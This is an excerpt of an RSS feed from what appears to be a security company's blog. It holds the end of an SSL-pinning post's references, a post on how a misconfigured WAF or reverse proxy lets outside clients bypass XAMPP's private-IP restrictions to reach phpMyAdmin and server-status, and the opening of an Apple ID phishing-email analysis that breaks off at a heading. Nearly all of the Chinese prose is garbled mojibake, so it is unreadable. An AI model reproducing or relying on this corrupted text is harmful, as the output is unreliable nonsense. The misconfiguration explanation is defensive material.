  &lt;li&gt;&lt;a href=&quot;http://android-developers.blogspot.com/2012/03/unifying-key-store-access-in-ics.html&quot;&gt;Unifying Key Store Access in ICS | Android Developers Blog&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://commonsware.com/blog/2013/03/04/ssl-android-basics.html&quot;&gt;The CommonsBlog ‚Äî SSL on Android: The Basics&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.android.com/training/articles/security-ssl.html&quot;&gt;Security with HTTPS and SSL | Android Developers&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.apple.com/librarY/mac/documentation/NetworkingInternet/Conceptual/NetworkingTopics/Articles/OverridingSSLChainValidationCorrectly.html&quot;&gt;Networking Programming Topics: Overriding TLS Chain Validation Correctly&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.apple.com/library/ios/technotes/tn2232/_index.html&quot;&gt;Technical Note TN2232: HTTPS Server Trust Evaluation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning&quot;&gt;Certificate and Public Key Pinning - OWASP&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:note1&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;Google Âü∫ÊñºÊïàËÉΩÂèäÊúâÊïàÊÄßÁöÑËÄÉÈáèÔºåÂú® Android Á≥ªÁµ±‰∏äÈ†êË®≠ÂÅúÁî®&lt;a href=&quot;https://code.google.com/p/android/issues/detail?id=68643&quot;&gt;ÊÜëË≠âÊí§Èä∑Ê™¢Êü•&lt;/a&gt;&lt;br /&gt;¬†&lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:note2&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;OWASP ÁöÑ Android ÁØÑ‰æã‰∏≠ÔºåÂÖßÂê´ÁöÑ PUB_KEY ÊòØÈåØË™§ÁöÑ (ÊúÄÂæåÊõ¥ÊîπÊó•Êúü 2014/08/14)¬†&lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2014/08/15/ssl-mishandling-on-mobile-app-development/</link>
                <guid>https://devco.re/blog/2014/08/15/ssl-mishandling-on-mobile-app-development</guid>
                <pubDate>Fri, 15 Aug 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Ë®≠ÂÇô‰∏çËâØË®≠ÂÆöÂ∏∂‰æÜÁöÑÂÆâÂÖ®È¢®Èö™Ôºö‰ª• WAF ÁÇ∫‰æã</title>
                <description>&lt;p&gt;ÈÅéÂéªË´áÂà∞Á∂≤Á´ôÂÆâÂÖ®ÔºåÈÄöÂ∏∏ÊúÉ‰ΩøÁî®Èò≤ÁÅ´ÁâÜÊàñ IDS ÈÄ≤Ë°åÈò≤Ë≠∑„ÄÇ‰ΩÜËøëÂπ¥‰æÜÁ∂≤Á´ôÂÆâÂÖ®Ë≠∞È°åÈÉΩÊòØ‰ª•Á∂≤È†ÅÊáâÁî®Á®ãÂºèÁöÑÊºèÊ¥ûÂ±ÖÂ§öÔºåÁÑ°Ê≥ïÂñÆÈù†Èò≤ÁÅ´ÁâÜÈòªÊìã„ÄÇ‰ª• OWASP Top 10 2013 ÁöÑÁ¨¨‰∏ÄÂêç Injection ËÄåË®ÄÔºåÂ§öÂçäÊòØÁ®ãÂºèÊí∞ÂØ´ÊñπÊ≥ï‰∏çÂö¥Ë¨πÊâÄÈÄ†ÊàêÔºåÂõ†Ê≠§ÊâçÊúâ‰∫ÜÁ∂≤È†ÅÊáâÁî®Á®ãÂºèÈò≤ÁÅ´ÁâÜ (Web Application Firewall, WAF) ÁöÑÂá∫Áèæ„ÄÇ&lt;/p&gt;

&lt;p&gt;Êúâ‰∫Ü WAF Â∞±ÊòØËê¨Èùà‰∏π‰∫ÜÂóéÔºüÂ∞±ÁÆóÊúâÂêÑÁ®ÆË≥áÂÆâË®≠ÂÇôÔºå‰ΩÜÁº∫‰πèÂÆâÂÖ®ÁöÑË®≠ÂÆöÔºåÊúâÁöÑÊôÇÂÄôÂèçËÄåÊúÉËÆìÁ≥ªÁµ±Èô∑ÂÖ•ÂÆâÂÖ®È¢®Èö™‰∏≠„ÄÇÊàëÂÄëÂ∞±‰ª• Reverse Proxy Êàñ WAF Ë®≠ÂÇô‰æÜÊé¢Ë®é‰∏ç‰Ω≥Ë®≠ÂÆöÂ∏∂‰æÜÁöÑÂÆâÂÖ®È¢®Èö™„ÄÇ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;waf-Êê≠ÈÖç‰∏ç‰Ω≥ÁöÑË®≠ÂÆöÊúÉÂ∏∂‰æÜ‰ªÄÈ∫ºÂç±ÂÆ≥&quot;&gt;WAF Êê≠ÈÖç‰∏ç‰Ω≥ÁöÑË®≠ÂÆöÊúÉÂ∏∂‰æÜ‰ªÄÈ∫ºÂç±ÂÆ≥Ôºü&lt;/h3&gt;

&lt;p&gt;‰ª•Â∏∏Ë¶ãÁöÑ mod_proxy Êê≠ÈÖç mod_security ÁöÑÊñπÊ°à‰æÜÁúãÔºåÈÄöÂ∏∏‰ΩøÁî® Reverse Proxy Êàñ Transparent Proxy ÁÇ∫ÂÖ∂Êû∂ÊßãÔºåÈÄèÈÅé Proxy ÁöÑÊñπÂºèÂú® Client Ëàá Web Server ‰πãÈñìÔºåÂ∞ç HTTP Request / Response ÈÄ≤Ë°åÈÅéÊøæÔºõ‰ª• HTTP Request ÁÇ∫‰æãÔºåÁï∂ WAF ÂÅµÊ∏¨Âà∞ Client Á´ØÁöÑË´ãÊ±Ç‰∏≠Êúâ SQL Injection Ë™ûÊ≥ïÊôÇÂÄôÔºåÂ∞áÊúÉÈòªÊñ∑ÈÄôÂÄãÈÄ£Á∑öÈò≤Ê≠¢Èß≠ÂÆ¢ÊîªÊìä„ÄÇ&lt;/p&gt;

&lt;p&gt;Âú®ÈÄôÁ®ÆÊû∂Êßã‰∏ãÁöÑ WAF Áúã‰ººÂ∞çÂæåÁ´ØÁöÑ‰º∫ÊúçÂô®Â§ö‰∫Ü‰∏Ä‰ªΩ‰øùÈöúÔºå‰ΩÜ‰πü‰∏¶ÈùûÂÆåÁæé„ÄÇÂÖ∂ÂïèÈ°åÊòØÂæåÁ´ØÁöÑ Web Server Âú®ÈÄèÈÅé WAF Â≠òÂèñÁöÑÊÉÖÊ≥Å‰∏ãÔºåÁÑ°Ê≥ïÂæóÁü•‰æÜËá™ Client Á´ØÁöÑ‰æÜÊ∫ê IPÔºåÁõ∏ÂèçÁöÑ Web Server ËÉΩÁúãÂà∞ÁöÑ IP ÈÉΩÂ∞áÊòØ WAF ÁöÑ IP (REMOTE ADDR)ÔºåÂú®ÈÄôÁ®ÆÊÉÖÊ≥Å‰∏ãÂèØËÉΩÈÄ†Êàê Client Á´ØÂèØ‰ª•Â≠òÂèñÂèó IP ‰æÜÊ∫êÈôêÂà∂ÁöÑÁ≥ªÁµ±„ÄÇÂª∂‰º∏Èñ±ËÆÄÔºö&lt;a href=&quot;http://devco.re/blog/2014/06/19/client-ip-detection/&quot;&gt;Â¶Ç‰ΩïÊ≠£Á¢∫ÁöÑÂèñÂæó‰ΩøÁî®ËÄÖ IPÔºü&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;‰ª•‰∏ãÂúñÁÇ∫‰æãÔºåÁ∂≤Á´ôÊú¨Ë∫´Âè™ÂÖÅË®± 192.168.x.x ÁöÑÁ∂≤ÊÆµÈÄ£Á∑öÔºåÂ¶ÇÊûú‰ªäÂ§© Client IP ÊòØ 1.1.1.1ÔºåÂ∞áÁÑ°Ê≥ïÂ≠òÂèñË©≤Á∂≤Á´ô„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-01.png&quot; alt=&quot;ÈôêÂà∂ IP Â≠òÂèñ&quot; title=&quot;ÈôêÂà∂ IP Â≠òÂèñ&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;‰ΩÜÂú®ÊúâÂª∫ÁΩÆ WAF ÁöÑÊû∂Êßã‰πã‰∏ãÔºåClient ÈÄèÈÅé WAF Â≠òÂèñÁ∂≤Á´ôÔºåÁ∂≤Á´ôÂæóÂà∞ÁöÑ IP ÊúÉÊòØ WAF ÁöÑ IPÔºö192.168.1.10ÔºåÂõ†Ê≠§ÂÖÅË®±ÈÄ£Á∑öÔºåClient Âõ†ËÄåÂèñÂæóÂéüÊú¨ÈúÄÂú®ÂÖßÁ∂≤ÊâçËÉΩÂ≠òÂèñÁöÑË≥áÊñô„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-02.png&quot; alt=&quot;Âõ†ÁÇ∫ WAF ËÄåÁπûÈÅé IP ÈôêÂà∂&quot; title=&quot;Âõ†ÁÇ∫ WAF ËÄåÁπûÈÅé IP ÈôêÂà∂&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;ÂØ¶ÈöõÊ°à‰æã&quot;&gt;ÂØ¶ÈöõÊ°à‰æã&lt;/h3&gt;

&lt;p&gt;ÊàëÂÄë‰ª•Â∏∏Ë¶ãÁöÑ Web Server Êï¥ÂêàÂåÖ XAMPP ÁÇ∫‰æãÔºåÂú®È†êË®≠ÁöÑ http-xampp.conf Ë®≠ÂÆöÊ™î‰∏≠ÈôêÂà∂‰∫Ü‰∏Ä‰∫õÁÆ°ÁêÜÈ†ÅÈù¢Âè™ËÉΩÁî± Private IP Â≠òÂèñÔºåÂ¶Ç /security „ÄÅ /webalizer „ÄÅ /phpmyadmin „ÄÅ /server-status „ÄÅ /server-info Á≠âÔºåÊ≠§ÊôÇ WAF ÁöÑ IP Ëã•ÁÇ∫ Private IPÔºå‰æù XAMPP È†êË®≠Ë®≠ÂÆöÔºåWAF Â∞áÂèØ‰ª•Â≠òÂèñÈÄô‰∫õÂèó IP ÈôêÂà∂ÁöÑË≥áÊ∫êÔºåÁï∂ WAF Â≠òÂèñÂÆåË≥áÊ∫êÂæåÂèàÂ∞áÂÖßÂÆπÂõûÂÇ≥Áµ¶ Client Á´Ø„ÄÇ&lt;/p&gt;

&lt;p&gt;http-xampp.conf È†êË®≠Ë®≠ÂÆö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;LocationMatch&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;^/(?i:(?:xampp|security|licenses|phpmyadmin|webalizer|server-status|server-info))&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;        &lt;span class=&quot;nc&quot;&gt;Order&lt;/span&gt; deny,allow
        &lt;span class=&quot;nc&quot;&gt;Deny&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;Allow&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; ::1 127.0.0.0/8 \
                fc00::/7 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 \
                fe80::/10 169.254.0.0/16
         &lt;span class=&quot;nc&quot;&gt;ErrorDocument&lt;/span&gt; 403 /error/XAMPP_FORBIDDEN.html.var
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;LocationMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Â¶ÇÊûúÁÖßËëóÈ†êË®≠ÁöÑË®≠ÂÆöÔºå‰ª•ÁèæÊàêÁöÑÊ°à‰æã‰æÜÁúãÔºåËÉΩÂ§†Â≠òÂèñ Apache Server ÁöÑÁ≥ªÁµ±ÁãÄÊÖãÔºåÂÖ∂‰∏≠ÂèØ‰ª•ÁúãÂà∞Á∂≤Á´ôÊâÄÊúâÈÄ£Á∑ö‰ª•Âèä URI Á≠âË≥áÊñô„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-05.png&quot; alt=&quot;È†êË®≠ÈñãÊîæ Apache ‰º∫ÊúçÂô®ÁãÄÊÖã&quot; title=&quot;È†êË®≠ÈñãÊîæ Apache ‰º∫ÊúçÂô®ÁãÄÊÖã&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;‰∏¶‰∏îÂèØ‰ª•Áõ¥Êé•ËÆÄÂèñ phpMyAdmin ‰ªãÈù¢Ôºå‰∏¶‰∏îËá≥Ë≥áÊñôÂ∫´‰∏≠Êñ∞Â¢û„ÄÅ‰øÆÊîπ„ÄÅÂà™Èô§Ë≥áÊñôÔºåÁîöËá≥Áõ¥Êé•‰∏äÂÇ≥ webshell ÈÄ≤ÂÖ•‰∏ªÊ©ü„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-06.png&quot; alt=&quot;Áõ¥Êé•ÈÄ≤ÂÖ• phpMyAdmin ÁÆ°ÁêÜ‰ªãÈù¢&quot; title=&quot;Áõ¥Êé•ÈÄ≤ÂÖ• phpMyAdmin ÁÆ°ÁêÜ‰ªãÈù¢&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;XAMPP ‰πüÂÖßÂª∫‰∫ÜÁ∂≤Á´ôË®òÈåÑÂàÜÊûêÂ∑•ÂÖ∑ webalizerÔºåÈÄèÈÅéÈÄôÂÄã‰ªãÈù¢ÂèØ‰ª•Áü•ÈÅìÁ∂≤Á´ôÊâÄÊúâÈÄ≤ÂÖ•ÈªûÁöÑÊµÅÈáè„ÄÅÁµ±Ë®àÊï∏ÊìöÁ≠â„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-09.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-09.png&quot; alt=&quot;Á∂≤Á´ôË®òÈåÑÂàÜÊûêÂ∑•ÂÖ∑ webalizer&quot; title=&quot;Á∂≤Á´ôË®òÈåÑÂàÜÊûêÂ∑•ÂÖ∑ webalizer&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;Â∞èÁµê&quot;&gt;Â∞èÁµê&lt;/h3&gt;

&lt;p&gt;Â¶ÇÊûúÂª∫ÁΩÆ‰∫Ü WAFÔºåÊúâÈóú IP ÁöÑË®≠ÂÆöÂøÖÈ†àË¶ÅÂæû WAF ÊîØÊè¥ÁöÑ HTTP Header ‰∏≠ÂèñÂá∫‰ΩøÁî®ËÄÖÁöÑ IP (REMOTE_ADDR)ÔºåÊâçËÉΩËÆìÂéüÊú¨Á∂≤Á´ôÁöÑ IP ÈôêÂà∂ÁîüÊïà„ÄÇÂú®ÈÄôÁ®ÆË®≠ÂÆöÈåØË™§ÊàñÊòØÂ∞ç WAF Êû∂Êßã‰∏çÁû≠Ëß£ÁöÑÊÉÖÊ≥Å‰∏ãÔºåWAF ÂèçËÄåÊàêÁÇ∫Èß≠ÂÆ¢ÁπûÈÅé Private IP ÈôêÂà∂ÁöÑË∑≥ÊùøÔºåÂ∞±Â¶ÇÂêåÁÇ∫Èß≠ÂÆ¢Èñã‰∫Ü‰∏ÄÂÄãÂæåÈñÄ„ÄÇÂõ†Ê≠§Âú®‰ΩøÁî®Ë≥áÂÆâË®≠ÂÇôÊôÇÔºåÂøÖÈ†àÁû≠Ëß£ÂÖ∂Êû∂Êßã„ÄÇÂà•ËÆìË≥áÂÆâË®≠ÂÇô„ÄÅÂÆâÂÖ®Ê©üÂà∂ÔºåÂèçËÄå‰ΩøÂæó‰º∫ÊúçÂô®Êõ¥‰∏çÂÆâÂÖ®„ÄÇ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/07/18/waf-configuration-security-issue/</link>
                <guid>https://devco.re/blog/2014/07/18/waf-configuration-security-issue</guid>
                <pubDate>Fri, 18 Jul 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Apple ID Èá£È≠öÈÉµ‰ª∂Ê°à‰æã</title>
                <description>&lt;p&gt;‰ªäÂ§©ÂèàÊúâ‰∏çÊÄïÊ≠ªÁöÑ‰∫∫ÂØÑ‰æÜÈá£È≠ö‰ø°‰∫ÜÔºåÈÄôÊ¨°ÊòØÈ®ôÂèñ Apple ID„ÄÇËÆìÊàëÂÄë‰æÜÁúãÁúãÈÄôÂ∞Å‰ø°ÔºåÂÖ∂‰∏≠ÂÖßÂÆπÊúâÈùûÂ∏∏Â§öÁ†¥Á∂ªÔºå‰πüÂ∑≤Á∂ìË¢´ Gmail Áõ¥Êé•ÂÆöÁÇ∫ Spam ‰∫ÜÔºåÈùûÂ∏∏ÂèØÊÜê„ÄÇÈô§‰∫Ü‰ø°‰ª∂‰πãÂ§ñÔºåÈá£È≠öÁöÑÁ∂≤È†ÅÊú¨Ë∫´‰πüÂæàÂÄºÂæóÊàëÂÄëÂÄüÈè°ÔºåËÆìÊàëÂÄë‰æÜÁúãÁúãÈÄôÊ¨°ÁöÑÈá£È≠öÈÉµ‰ª∂Ê°à‰æã„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-01.png&quot; alt=&quot;Apple ID Èá£È≠ö‰ø°&quot; title=&quot;Apple ID Èá£È≠ö‰ø°&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;Â¶Ç‰ΩïÂà§Âà•Èá£È≠ö‰ø°Âë¢&quot;&gt;Â¶Ç‰ΩïÂà§Âà•Èá£È≠ö‰ø°Âë¢Ôºü&lt;/h3&gt;

&lt;p&gt;ÂÖà‰æÜË´áË´áË¶ÅÂ¶Ç‰ΩïÂà§Âà•Èá£È≠ö‰ø°Âë¢„ÄÇÊàëÂÄëÂèØ‰ª•ÂæûÂõõÂÄãË¶ÅÁ¥†‰æÜÁúãÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Ê®ôÈ°å&lt;/li&gt;
  &lt;li&gt;ÂØÑ‰ª∂ËÄÖ&lt;/li&gt;
  &lt;li&gt;ÂÖßÊñá&lt;/li&gt;
  &lt;li&gt;ÈÄ£Áµê&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;Ê®ôÈ°å&quot;&gt;Ê®ôÈ°å&lt;/h4&gt;

&lt;p&gt;È¶ñÂÖàÔºåÈÄôÂ∞Å‰ø°ÁöÑÊ®ôÈ°åÈùûÂ∏∏ÂÅáÔºå‰∏ÄËà¨‰æÜË™™ÂÖ¨Âè∏‰∏çÊúÉ‰ΩøÁî®ÈÄôÈ°ûÊ®ôÈ°åÔºåÈÄôÁ®ÆÂà§Êñ∑ÊØîËºÉÈúÄË¶ÅÁ∂ìÈ©ó„ÄÇÈá£È≠ö‰ø°‰ª∂ÊúÉ‰ΩøÁî®ÈùûÂ∏∏ËÅ≥Âãï„ÄÅÂê∏Âºï‰Ω†ÂéªÂÅöÂãï‰ΩúÁöÑÊ®ôÈ°å„ÄÇ‰æãÂ¶ÇÂ∏∏Ë¶ãÁöÑ„Äå‰Ω†ÁöÑÂ∏≥ËôüÈÅ≠Âà∞ÂÅúÁî®„Äç„ÄÅ„ÄåÊõ¥ÊèõÂ∏≥ËôüË≥áË®äÈÄöÁü•„ÄçÁ≠â„ÄÇÈªû‰∏ãÈÄ£ÁµêÂ∞±ÊúÉÂ∏∂‰Ω†ÂéªÂÅáÈÄ†ÁöÑÈ†ÅÈù¢È®ô‰Ω†Ëº∏ÂÖ•ÂØÜÁ¢ºÔºåÂçÉËê¨Âà•ÂÇªÂÇªÁï∂Áúü„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;ÂØÑ‰ª∂ËÄÖ&quot;&gt;ÂØÑ‰ª∂ËÄÖ&lt;/h4&gt;

&lt;p&gt;ÂØÑ‰ª∂ËÄÖÈÄöÂ∏∏ÊòØÈá£È≠ö‰ø°‰∏ÄÂÆöÊúÉÂä†Âº∑ÂÅáÈÄ†ÁöÑÈÉ®ÂàÜÔºåÂà©Áî®ÂÆòÊñπÂ≠òÂú®ÁöÑ‰ø°ÁÆ±ÊàñÊòØ‰ªñ‰∫∫ÁöÑ‰ø°ÁÆ±ÂØÑ‰ø°ÔºåÂä†Âº∑‰Ω†ÁöÑ‰ø°‰ªª„ÄÇ‰∏çÈÅéÈúÄË¶ÅÁâπÂà•Ê≥®ÊÑèÁöÑÊòØÔºö&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ÂØÑ‰ª∂ËÄÖÁöÑÊ¨Ñ‰ΩçÊòØÂèØ‰ª•ÂÅáÈÄ†„ÄÅÈö®ÊÑèÂ°´ÂØ´ÁöÑÔºåÂçÉËê¨‰∏çË¶ÅÁõ¥Êé•‰ø°‰ªª„ÄÇ&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;‰ª•ÈÄôÂ∞Å‰ø°ÁÇ∫‰æãÔºåÂØÑ‰ª∂ËÄÖ„Äåservice@apple.com„ÄçÊòØ‰∏çÂ≠òÂú®ÁöÑ„ÄÇÁï∂ÁÑ∂ÈÄôÂÄãÊ¨Ñ‰ΩçÂèØ‰ª•ÂÅáÈÄ†Ôºå‰ΩÜÈÄ£ÂÅáÈÄ†ÈÉΩÈåØÔºåÂØ¶Âú®ÊòØÈùûÂ∏∏‰∏çÁî®ÂøÉ„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;ÂÖßÊñá&quot;&gt;ÂÖßÊñá&lt;/h4&gt;

&lt;p&gt;‰ø°‰ª∂ÁöÑÂÖßÊñáÂ∞±ÊòØÁ≤æËèØ‰∫ÜÔºåË¶ÅÊÄéÈ∫ºÂÅöÂá∫‰∏ÄÂ∞ÅÂæàÂÉèÂÆòÊñπÁöÑ‰ø°‰ª∂ÔºåÂèàË¶ÅË™ò‰Ωø‰∫∫ÂéªÈªûÈÅ∏ÔºåÂØ¶Âú®ÊòØ‰∏ÄÈñÄËóùË°ì„ÄÇÁ≤æÂøÉË®≠Ë®àÁöÑÈá£È≠ö‰ø°„ÄÅÁ§æ‰∫§Â∑•Á®ã„ÄÅAPT ÈÉµ‰ª∂ÔºåÈÄöÂ∏∏ÈÉΩÊúÉÈáùÂ∞çÂèóÂÆ≥ËÄÖÂÆ¢Ë£ΩÂåñÔºåË™øÊü•Ë∫´ÈÇäÁöÑÁ§æ‰∫§Âúà„ÄÅÂ∏∏Ë´áÁöÑË©±È°å„ÄÅÂ∏∏Áî®ÁöÑÊúçÂãô„ÄÅÊúÉÈªûÊìäÁöÑÈÉµ‰ª∂Ôºå‰æÜË£ΩÈÄ†‰∏ÄÂÄã‰∏ÄÂÆöÊúÉ‰∏≠ÁçéÁöÑ‰ø°‰ª∂„ÄÇ&lt;/p&gt;

&lt;p&gt;Áï∂ÁÑ∂ÂæàÂ§öÊôÇÂÄôÊîªÊìäËÄÖË™øÊü•‰∏çË∂≥ÔºåÈÇÑÊòØÊúÉÂá∫ÁèæËõõÁµ≤È¶¨Ë∑°ÁöÑ„ÄÇ‰æãÂ¶Ç‰æÜËá™‰∏≠ÂúãÁöÑÊÉ°ÊÑèÈÉµ‰ª∂ÔºåÂ∏∏ÊúÉÂá∫Áèæ„Äå&lt;strong&gt;Â∞äÊï¨ÁöÑÁî®Êà∂ÊÇ®Â•Ω&lt;/strong&gt;„ÄçÈÄôÁ®ÆÂú®Âè∞ÁÅ£‰∫∫Áúº‰∏≠Áúã‰∫ÜÂæàÂΩÜÊâ≠ÁöÑË©ûÂΩô„ÄÇÂ¶ÇÊûúÂá∫Áèæ‰∫Ü‰∏çÂ∏∏Ë¶ãÁöÑÁî®Ë©ûÔºåÂ∞±ÈùûÂ∏∏ÊúâÂèØËÉΩÊòØ‰∏ÄÂÄãÂÅáÈÄ†ÁöÑÊÉ°ÊÑèÈÉµ‰ª∂ÔºåÂçÉËê¨‰∏çË¶ÅÂÇªÂÇªÁöÑÈªûÈÅ∏ÈÄ£ÁµêÊàñÈôÑ‰ª∂„ÄÇ&lt;/p&gt;

&lt;p&gt;ÂÜçÂõûÈ†≠‰æÜ‰ª•ÈÄôÂ∞Å‰ø°ÁÇ∫‰æãÔºåÊúÄÂ§ßÁöÑÁ†¥Á∂ªÈô§‰∫ÜÈùûÂà∂ÂºèÁöÑÂÖßÊñá‰πãÂ§ñÔºåÂ∞±Â±¨ÁΩ≤Âêç‰∫Ü„ÄÇÊòéÊòéÊòØÂÅáÈÄ†„ÄåApple Customer Support„ÄçÁöÑ‰æÜ‰ø°ÔºåÊúÄ‰∏ãÈù¢ÂçªÁ∞ΩÁΩ≤„ÄåMicrosoft Privacy and cookies Developers„ÄçÔºåÊúâÊ≤íÊúâÊêûÈåØÔºüÂèØ‰ª•ÂÜçÁî®ÈªûÂøÉÂóéÔºü&lt;/p&gt;

&lt;h4 id=&quot;ÈÄ£Áµê&quot;&gt;ÈÄ£Áµê&lt;/h4&gt;

&lt;p&gt;ÊúÄÂæåÁöÑÈáçÈªûÂ∞±ÊòØ‰ø°‰ª∂‰∏≠ÁöÑÈá£È≠öÈÄ£Áµê‰∫ÜÔºåÈÄöÂ∏∏ÈÄôÂÄãÈÄ£ÁµêÊúÉÂ∏∂‰Ω†ÂâçÂæÄ‰∏ÄÂÄãÈï∑ÂæóË∑üÂÆòÊñπÁ∂≤Á´ô‰∏ÄÊ®°‰∏ÄÊ®£ÁöÑÁôªÂÖ•È†ÅÈù¢ÔºåÈ®ô‰Ω†Ëº∏ÂÖ•Â∏≥ËôüÂØÜÁ¢ºÁôªÂÖ•‰æÜÁ´äÂèñ„ÄÇÂú®ÈªûÈÅ∏Ë∂ÖÈÄ£Áµê‰πãÂâçÔºå‰∏ÄÂÆöË¶ÅÂÖàÁúã‰∏Ä‰∏ãÈÄôÂÄãÈÄ£ÁµêÂâçÂæÄÁöÑ‰ΩçÁΩÆÊòØ‰∏çÊòØÂÆòÊñπÁöÑ‰ΩçÁΩÆÔºå‰æãÂ¶ÇÊòØ Apple ÁöÑ‰ø°‰ª∂ÈÄöÂ∏∏Â∞±ÊúÉÊòØÂâçÂæÄ Apple.com Ëá™Â∑±ÁöÑÁ∂≤ÂüüÂêçÁ®±„ÄÇÁï∂ÁÑ∂Êõ¥Ë¶ÅÁâπÂà•Ê≥®ÊÑèÁöÑÊòØÂÅáÈÄ†ÁöÑÁ∂≤ÂüüÂêçÁ®±Ôºå‰æãÂ¶Ç‰ΩøÁî®„ÄåApp1e.com„Äç‰æÜÂÅΩË£ùÊàê„ÄåApple.com„ÄçÔºå‰πüÊòØÈùûÂ∏∏Â∏∏Ë¶ãÁöÑ„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄôÂ∞Å‰ø°‰∏≠‰ΩøÁî®‰∫ÜÊúÄ‰∏çÁî®ÂøÉÁöÑÁî®Ê≥ïÔºåÂ∞±ÊòØÁõ¥Êé•ÊãøÈá£È≠öÁ∂≤Á´ôÁöÑ URL ‰æÜÁï∂ÈÄ£ÁµêÔºå‰∏Ä‰æÜÈï∑ÂæóË∑üÂÆòÊñπÁ∂≤ÂüüÊ†πÊú¨‰∏çÂÉèÔºå‰∫å‰æÜËêΩËêΩÈï∑ÁöÑÈÄ£ÁµêÔºåÂà∞Â∫ïÊòØÊÉ≥Ë¶ÅÈ®ôË™∞ÈªûÈÅ∏Âë¢Ôºü&lt;/p&gt;

&lt;h3 id=&quot;‰ø°‰ª∂Ê®ôÈ†≠ËóèÊúâÊîªÊìäËÄÖÁöÑËõõÁµ≤È¶¨Ë∑°&quot;&gt;‰ø°‰ª∂Ê®ôÈ†≠ËóèÊúâÊîªÊìäËÄÖÁöÑËõõÁµ≤È¶¨Ë∑°&lt;/h3&gt;

